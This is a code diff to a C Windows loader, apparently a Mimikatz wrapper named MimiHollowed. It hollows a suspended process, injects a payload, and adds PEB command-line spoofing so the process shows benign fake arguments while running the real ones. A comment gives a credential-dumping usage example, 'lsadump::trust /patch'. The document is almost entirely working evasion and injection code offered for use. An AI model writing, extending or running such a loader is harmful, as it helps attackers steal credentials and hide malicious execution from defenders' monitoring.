@@ -86,79 +86,198 @@ BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr, IN P
 }
 
 VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
-    DWORD dwBytesAvailable = 0;
-    BYTE* pOutputData = NULL;
+    BOOL bSuccess = TRUE;
+    do {
+        DWORD dwBytesAvailable = 0;
+        BYTE* pOutputData = NULL;
 
-    // Check if there's data to read without removing it
-    if (PeekNamedPipe(hOutputPipe, NULL, 0, NULL, &dwBytesAvailable, NULL) && dwBytesAvailable > 0) {
-        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable + 1); // +1 for null terminator
-        if (!pOutputData) return;
+        PeekNamedPipe(hOutputPipe, NULL, NULL, NULL, &dwBytesAvailable, NULL);
 
-        DWORD dwBytesRead = 0;
-        if (ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, &dwBytesRead, NULL)) {
-            if (dwBytesRead > 0) {
-                pOutputData[dwBytesRead] = '\0'; // Ensure null-terminated
-                printf("%.*s", dwBytesRead, pOutputData);
-            }
+        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable);
+        if (!pOutputData) break;
+
+        if (!(bSuccess = ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, NULL, NULL))) {
+            LocalFree(pOutputData);
+            break;
         }
+
+        printf("%.*s", dwBytesAvailable, pOutputData);
         LocalFree(pOutputData);
-    }
+    } while (bSuccess);
 }
+
+typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
+    HANDLE ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength
+    );
 
 BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
     OUT PPROCESS_INFORMATION pProcInfo, OUT HANDLE* phInputPipe, OUT HANDLE* phOutputPipe) {
 
-    STARTUPINFO stStartupInfo = { 0 };
+    STARTUPINFOA stStartupInfo = { 0 };
     SECURITY_ATTRIBUTES saSecurity = { 0 };
     HANDLE hInputRead = NULL, hInputWrite = NULL, hOutputRead = NULL, hOutputWrite = NULL;
-    LPSTR szCommandLine = NULL;
+    LPSTR szFakeCommandLine = NULL;
+    LPSTR szRealCommandLine = NULL;
     BOOL bResult = FALSE;
 
-    ZeroMemoryCustom((BYTE*)pProcInfo, sizeof(PROCESS_INFORMATION));
-    ZeroMemoryCustom((BYTE*)&stStartupInfo, sizeof(STARTUPINFO));
-    ZeroMemoryCustom((BYTE*)&saSecurity, sizeof(SECURITY_ATTRIBUTES));
+    ZeroMemory(pProcInfo, sizeof(PROCESS_INFORMATION));
+    ZeroMemory(&stStartupInfo, sizeof(STARTUPINFOA));
+    ZeroMemory(&saSecurity, sizeof(SECURITY_ATTRIBUTES));
 
     saSecurity.nLength = sizeof(SECURITY_ATTRIBUTES);
     saSecurity.bInheritHandle = TRUE;
 
     if (!CreatePipe(&hInputRead, &hInputWrite, &saSecurity, 0)) {
-        printf("CreatePipe[1], error: %lu", GetLastError());
+        printf("CreatePipe[1], error: %lu\n", GetLastError());
         goto CLEANUP;
     }
 
     if (!CreatePipe(&hOutputRead, &hOutputWrite, &saSecurity, 0)) {
-        printf("CreatePipe[2], error: %lu", GetLastError());
+        printf("CreatePipe[2], error: %lu\n", GetLastError());
         goto CLEANUP;
     }
 
-    stStartupInfo.cb = sizeof(STARTUPINFO);
+    stStartupInfo.cb = sizeof(STARTUPINFOA);
     stStartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
     stStartupInfo.wShowWindow = SW_HIDE;
     stStartupInfo.hStdInput = hInputRead;
     stStartupInfo.hStdOutput = stStartupInfo.hStdError = hOutputWrite;
 
-    szCommandLine = (LPSTR)LocalAlloc(LPTR, strlen(szProcessPath) + (szArguments ? strlen(szArguments) : 0) + 2);
-    if (!szCommandLine) {
-        printf("LocalAlloc, error: %lu", GetLastError());
+    // Build fake command line (benign looking)
+    char szFakeArgs[] = " -k LocalServiceNetworkRestricted";
+    // char szFakeArgs[] = " /c \"echo Windows Update\"";
+
+    size_t fakeBufferSize = strlen(szProcessPath) + strlen(szFakeArgs) + 1;
+    szFakeCommandLine = (LPSTR)LocalAlloc(LPTR, fakeBufferSize);
+    if (!szFakeCommandLine) {
+        printf("LocalAlloc failed for fake command line: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
+    sprintf_s(szFakeCommandLine, fakeBufferSize, "%s%s", szProcessPath, szFakeArgs);
+
+    // Build real command line
+    if (szArguments && szArguments[0] != '\0') {
+        size_t realBufferSize = strlen(szProcessPath) + strlen(szArguments) + 2;
+        szRealCommandLine = (LPSTR)LocalAlloc(LPTR, realBufferSize);
+        if (!szRealCommandLine) {
+            printf("LocalAlloc failed for real command line: %lu\n", GetLastError());
+            goto CLEANUP;
+        }
+        sprintf_s(szRealCommandLine, realBufferSize, "%s %s", szProcessPath, szArguments);
+    }
+    else {
+        szRealCommandLine = (LPSTR)LocalAlloc(LPTR, strlen(szProcessPath) + 1);
+        if (!szRealCommandLine) {
+            printf("LocalAlloc failed for real command line: %lu\n", GetLastError());
+            goto CLEANUP;
+        }
+        strcpy_s(szRealCommandLine, strlen(szProcessPath) + 1, szProcessPath);
+    }
+
+    // Create process with fake arguments using CreateProcessA
+    if (!CreateProcessA(NULL, szFakeCommandLine, NULL, NULL, TRUE,
+        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &stStartupInfo, pProcInfo)) {
+        printf("CreateProcessA failed: %lu\n", GetLastError());
         goto CLEANUP;
     }
 
-    sprintf(szCommandLine, szArguments ? "%s %s" : "%s", szProcessPath, szArguments ? szArguments : ", error: %lu", GetLastError());
+    // Now spoof the command line in PEB
+    PROCESS_BASIC_INFORMATION pbi = { 0 };
+    PEB peb = { 0 };
+    RTL_USER_PROCESS_PARAMETERS parameters = { 0 };
 
-    if (!CreateProcessA(NULL, szCommandLine, NULL, NULL, TRUE,
-        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &stStartupInfo, pProcInfo)) {
-        printf("CreateProcessA, error: %lu", GetLastError());
+    // Get NtQueryInformationProcess
+    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
+    if (pNtQueryInformationProcess == NULL) {
+        printf("Failed to get NtQueryInformationProcess address: %lu\n", GetLastError());
         goto CLEANUP;
     }
+
+    // Query process information
+    NTSTATUS status = pNtQueryInformationProcess(pProcInfo->hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
+    if (status != 0) {
+        printf("NtQueryInformationProcess failed: 0x%lx\n", status);
+        goto CLEANUP;
+    }
+
+    // Read PEB
+    if (!ReadProcessMemory(pProcInfo->hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
+        printf("ReadProcessMemory (PEB) failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    // Read process parameters
+    if (!ReadProcessMemory(pProcInfo->hProcess, peb.ProcessParameters, &parameters, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
+        printf("ReadProcessMemory (ProcessParameters) failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    // Convert real command line to wide string (PEB uses Unicode)
+    int wideRealCmdLineLen = MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, NULL, 0);
+    if (wideRealCmdLineLen == 0) {
+        printf("MultiByteToWideChar (get length) failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    LPWSTR wideRealCommandLine = (LPWSTR)LocalAlloc(LPTR, wideRealCmdLineLen * sizeof(WCHAR));
+    if (!wideRealCommandLine) {
+        printf("LocalAlloc for wide real command line failed: %lu\n", GetLastError());
+        goto CLEANUP;
+    }
+
+    if (MultiByteToWideChar(CP_ACP, 0, szRealCommandLine, -1, wideRealCommandLine, wideRealCmdLineLen) == 0) {
+        printf("MultiByteToWideChar failed: %lu\n", GetLastError());
+        LocalFree(wideRealCommandLine);
+        goto CLEANUP;
+    }
+
+    // Write real command line to process memory
+    if (!WriteProcessMemory(pProcInfo->hProcess, parameters.CommandLine.Buffer, wideRealCommandLine,
+        wideRealCmdLineLen * sizeof(WCHAR), NULL)) {
+        printf("WriteProcessMemory (CommandLine) failed: %lu\n", GetLastError());
+        LocalFree(wideRealCommandLine);
+        goto CLEANUP;
+    }
+
+    // Update command line length
+    USHORT newLength = (USHORT)((wideRealCmdLineLen - 1) * sizeof(WCHAR)); // -1 to exclude null terminator
+    if (!WriteProcessMemory(pProcInfo->hProcess,
+        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
+        &newLength, sizeof(USHORT), NULL)) {
+        printf("WriteProcessMemory (CommandLine.Length) failed: %lu\n", GetLastError());
+        // Continue anyway, as the command line might still work
+    }
+
+    LocalFree(wideRealCommandLine);
 
     *phInputPipe = hInputWrite;
     *phOutputPipe = hOutputRead;
     bResult = TRUE;
 
+    printf("Process created with spoofed command line\n");
+    printf("Fake command line: %s\n", szFakeCommandLine);
+    printf("Real command line: %s\n", szRealCommandLine);
+
 CLEANUP:
-    if (szCommandLine) LocalFree(szCommandLine);
+    if (szFakeCommandLine) LocalFree(szFakeCommandLine);
+    if (szRealCommandLine) LocalFree(szRealCommandLine);
     if (hInputRead) CloseHandle(hInputRead);
     if (hOutputWrite) CloseHandle(hOutputWrite);
+
+    if (!bResult) {
+        // Cleanup on failure
+        if (pProcInfo->hProcess) {
+            TerminateProcess(pProcInfo->hProcess, 0);
+            CloseHandle(pProcInfo->hProcess);
+        }
+        if (pProcInfo->hThread) CloseHandle(pProcInfo->hThread);
+        ZeroMemory(pProcInfo, sizeof(PROCESS_INFORMATION));
+    }
+
     return bResult;
 }
 
@@ -243,24 +362,12 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
     }
 
     if (ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
-        printf("ResumeThread, error: % lu", GetLastError());
+        printf("ResumeThread, error: %lu", GetLastError());
         goto CLEANUP;
     }
 
-    DWORD dwExitCode = STILL_ACTIVE;
-    while (TRUE) {
-        if (!GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) {
-            printf("GetExitCodeProcess failed: %lu", GetLastError());
-            break;
-        }
-        if (dwExitCode != STILL_ACTIVE) break;
-
-        DisplayProcessOutput(hOutputPipe);
-        Sleep(100);
-    }
-
+    WaitForSingleObject(stProcInfo.hProcess, INFINITE);
     DisplayProcessOutput(hOutputPipe);
-
     bSuccess = TRUE;
 
 CLEANUP:
@@ -271,9 +378,12 @@ CLEANUP:
     return bSuccess;
 }
 
-#define TARGET_APP_PATH "C:\\Windows\\System32\\svchost.exe"
+#define TARGET_APP_PATH "C:\\Windows\\System32\\notepad.exe"
 
 int main(int argc, char* argv[]) {
+    /*
+        DUMMY USAGE EXAMPLE: MimiHollowed.exe coffee "lsadump::trust /patch" coffee (you can wrap any command in double quotes if it contains spaces)
+    */
     BYTE* pPayloadData = NULL;
     DWORD dwPayloadSize = LoadShellcodeIntoMemory((VOID**)&pPayloadData);
     CHAR* pPeArgs = NULL;
@@ -340,12 +450,6 @@ int main(int argc, char* argv[]) {
     else {
         pPeArgs = "coffee exit";
     }
-    
-    DeployPayload(pPayloadData, TARGET_APP_PATH, pPeArgs);
-    
-    if (pPayloadData)
-        VirtualFree(pPayloadData, 0, MEM_RELEASE);
-    if (pPeArgs)
-        VirtualFree(pPeArgs, 0, MEM_RELEASE);
-    
+
+    return DeployPayload(pPayloadData, TARGET_APP_PATH, pPeArgs) ? EXIT_SUCCESS : EXIT_FAILURE;
 }
